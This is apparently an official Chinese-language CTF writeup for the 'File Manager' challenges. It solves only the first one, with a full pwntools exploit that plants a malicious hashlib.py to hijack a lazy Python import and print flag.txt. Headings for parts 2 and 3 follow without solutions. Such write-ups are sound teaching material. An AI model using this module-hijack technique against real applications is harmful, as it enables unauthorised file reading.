---
title: File Manager Official Writeup
tags:
  - misc
  - pwn
  - CTF
categories:
  - Cyber
  - CTF Writeup
cover:
---

# 題目資訊

- **Challenge Repo:** [r3xdj/file-manager-challs](https://github.com/r3xdj/file-manager-challs)

> 如何開啟題目：`git clone` 完整題目後，進入各題資料夾，執行
> 
> ```bash
> docker-compose up --build
> ```
> 
> 三題分別會開在 localhost 的 port 10001, 10002, 10003。
> 
> 接著即可用 `nc` 或 `pwntools remote` 連入。
> 註：建議在 Linux 或 WSL 中操作

> 其實我是打算當黑箱題的XD

# Writeup

## File Manager 1

分類：Pwn / Misc

難度：Easy

```
Welcome to the file manager!
You can read files, calculate their hash, and create new files.

Flag Format: ZLCSC{*}
```

首先連入題目

```bash
nc localhost 10001
```

會出現一個選單

```
Welcome to the file manager!
You can read files, calculate their hash, and create new files.
Please be careful when creating files, as it may overwrite existing files.
Enjoy!
==============================
Welcome to the file manager!
==============================
1. read file
2. calculate hash
3. create file
4. exit
>>
```

### 首要的思路

我們先試著輸入`1`，看能不能讀取flag.txt

```
>> 1
filename: flag.txt
Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'flag.txt'.
```

沒有辦法。接著試著用**不同的檔案名稱**，如`flag.*`、`./flag.txt`，看能不能繞過。但經測試後發現都會因為包含特殊符號而被擋掉，我們只好另闢蹊徑。

### 程式碼洩漏

下一階段的想法是試圖leak出程式碼，這樣我們便能直接分析出那裡有漏洞。
為此，我們需要先弄清楚這個主程式的檔名。
在選單中輸入`3`

> 想法：一開始提到「用Create file功能要特別小心，因為可能覆蓋現有檔案」，那程式應該會阻止我們建立檔案名稱與主程式名稱相同的檔案。

```
>> 3
You will be asked for line (<=10), text and filename. The text will be written into the file for the number of lines you specified.
For example, if you enter 3 for line, and 'hello' for text, and 'text.txt' for filename, the file 'text.txt' will contain:
hello
hello
hello
And remember, the filename should not contain any spaces or special characters such as '/', '\', ':', '*', '?', '"', '<', '>', '|'.
And the filename should not be too long (less than 255 characters).
Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.
Caution: If you create a file with the same name as an existing file, it will overwrite the existing file!
line:
```

可以發現`Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.`這一行，因此主程式檔名非常有可能就叫做`main.py`。
我們這裡就先隨意建立一個空檔案以回到主選單

```
line: 1
line 1:
filename: trash
File created successfully!
```

回到主選單後我們便能使用`1. Read file`功能取得程式碼內容：

```python
#!/usr/bin/env python3
import os, sys

def init():
        sys.stdout.reconfigure(line_buffering=True)
        sys.stderr.reconfigure(line_buffering=True)
        os.system("stty -echo")

def Welcome():
        print("Welcome to the file manager!")
        print("You can read files, calculate their hash, and create new files.")
        print("Please be careful when creating files, as it may overwrite existing files.")
        print("Enjoy!")

def banner():
        print("="*30)
        print("Welcome to the file manager!")
        print("="*30)

check_filename = lambda fn, files: any(c in fn for c in " /\\:*?\"<>|") or len(fn) > 255 or os.path.basename(os.path.realpath(fn)) in files
file_exists = lambda fn: os.path.exists(fn)

def readfile(fn):
        if check_filename(fn, ["flag.txt"]):
                print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'flag.txt'.")
                return 1
        if not file_exists(fn):
                print("File does not exist!")
                return 1
        else:
                with open(fn, "r") as f:
                        print("Here is the content of the file:")
                        print(f.read())

def get_hash(filename):
        import hashlib
        sha256 = hashlib.sha256
        file = open(filename, "rb").read()
        return sha256(file)

def calhash(fn):
        if not file_exists(fn):
                print("File does not exist!")
                return 1
        else:
                print("Calculating hash...")
                print("The hash of the file is: " + str(get_hash(fn).hexdigest()))

def create_file_banner():
        print("You will be asked for line (<=10), text and filename. The text will be written into the file for the number of lines you specified.")
        print("For example, if you enter 3 for line, and 'hello' for text, and 'text.txt' for filename, the file 'text.txt' will contain:")
        print("hello")
        print("hello")
        print("hello")
        print("And remember, the filename should not contain any spaces or special characters such as '/', '\\', ':', '*', '?', '\"', '<', '>', '|'.")
        print("And the filename should not be too long (less than 255 characters).")
        print("Also, it can't be 'main.py' or 'flag.txt' to avoid breaking the program.")
        print("Caution: If you create a file with the same name as an existing file, it will overwrite the existing file!")

def createfile():
        create_file_banner()
        line = input("line: ")
        if not line.isdigit() or int(line) <= 0:
                print("Please enter a valid positive integer for line.")
                print("File creation failed!")
                return 1
        elif int(line) > 10:
                print("Please enter a smaller number for line (less than 10).")
                print("File creation failed!")
                return 1
        else:
                line = int(line)
        text = ""
        for i in range(line):
                text += input(f"line {i+1}: ") + "\n"
        while True:
                filename = input("filename: ")
                if check_filename(filename, ["main.py", "flag.txt"]):
                        print("Please enter a valid filename without spaces or special characters, and less than 255 characters, and not 'main.py' or 'flag.txt'.")
                else:
                        break
        with open(filename, "w") as f:
                f.write(text)
                print("File created successfully!")

def run():
        while True:
                banner()
                print("1. read file")
                print("2. calculate hash")
                print("3. create file")
                print("4. exit")
                ch = input(">> ")
                if ch == "1":
                        fn = input("filename: ")
                        readfile(fn)
                elif ch == "2":
                        fn = input("filename: ")
                        calhash(fn)
                elif ch == "3":
                        createfile()
                elif ch == "4":
                        print("Thank you for using the file manager!")
                        break
                print()


if __name__ == "__main__":
        init()
        Welcome()
        run()
```

### 程式碼漏洞分析

這裡我們注意到`get_hash()`這個函式~~(題目莫名的有這個功能，代表這裡一定有什麼跟解題相關的東西嘛)~~，是在函式之中才`import hashlib`。於是我們可以在檔案載入`hashlib`之前(也就是初次使用`2. calculate hash`)，先自己建立一個惡意的`hashlib.py`以達到Python Module Hijack.

> 這裡要說一下 Python 的 import 找模組過程：
> 
> 1. 尋找 `sys.modules` 中是否已有該模組(aka看該模組是否已載入過)
> 2. 找 Python 內建模組(如sys, time等)
> 3. 按照 `sys.path` 中的資料夾依序尋找，順序如下
>    1. **目前工作目錄** <-- ***我們建立的惡意 hashlib.py 在這裡***
>    2. 環境變數 `PYTHONPATH` 中指定的目錄
>    3. 標準函式庫(如os, json等) <-- ***hashlib 在這裡***
>    4. site-packages(pip安裝的模組)
> 
> 這也是我們的Python Module Hijack可以奏效的原因。



因此目前解題思路就清晰了：用`3. create file`功能建立惡意的`hashlib.py`，然後用`2. calculate hash` 去「計算`flag.txt`的Hash(其實是讀取並印出其中內容)」。

### 寫 exploit

首先構造`hashlib.py`。我們要偽造一個惡意的sha256函式(因main.py中第39行是調用sha256函式)，讓他被執行時原封不動地返回餵給他的原始內容，且須適用hexdigest方法。構造如下：

```python
class sha256:
    def __init__(self, data):
        self.data = data
    def hexdigest(self):
        return self.data.decode('utf-8', errors='ignore')
```

剩下的便是寫出「建立檔案」和「觸發計算hash功能」的程式碼啦！

完整exploit如下：

```python
#!/usr/bin/env python3
from pwn import *

p = remote("localhost", 10001)

def create_file(filename, content):
    p.sendlineafter(b">> ", b"3")  # 選擇建立檔案
    p.sendlineafter(b"line: ", str(len(content)).encode())  # 輸入行數
    for i, line in enumerate(content):
        p.sendlineafter(f"line {i+1}: ".encode(), line)  # 逐行輸入內容
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名

def calculate_hash(filename):
    p.sendlineafter(b">> ", b"2")  # 選擇計算 hash
    p.sendlineafter(b"filename: ", filename)  # 輸入檔名
    p.recvuntil(b"The hash of the file is: ")
    return p.recvline().strip().decode('utf-8')  # 接收並解碼 hash 結果

# ==========================================
# 步驟 1：利用「建立檔案」功能，偽造 hashlib.py
# ==========================================
# 設計 Payload：我們需要建立一個帶有 hexdigest() 方法的 sha256 class
# 這樣當 main.py 呼叫 sha256(file).hexdigest() 時，就會直接回傳 file (即 flag 內容)
payload = [
    b"class sha256:",
    b"    def __init__(self, data):",
    b"        self.data = data",
    b"    def hexdigest(self):",
    b"        return self.data.decode('utf-8', errors='ignore')" # 將 bytes 解碼為字串方便閱讀
]

create_file(b"hashlib.py", payload)

# ==========================================
# 步驟 2：觸發 calhash 讀取 flag.txt
# ==========================================

flag = calculate_hash(b"flag.txt")

print(f"\n[+] Exploit 成功！獲取到 Flag: {flag}")

p.close()
```

得到Flag：

```
ZLCSC{w45n7_1_C41cU1471nG_7h3_H45h?!?!}
```



## File Manager 2

分類：Pwn / Misc

難度：Hard

```
I've fixed the vulnerability in the previous version!
Also, I introduce a new "Backup" feature!

Flag Format: ZLCSC{*}
```

## File Manager 3

分類：Pwn / Misc

難度：Hard

```
I can't believe it... my file manager got pwned TWICE already.
Anyway, I've fixed everything this time.
By the way, the backup restore feature is finally here!

Flag Format: ZLCSC{*}
```

# 心得與後記
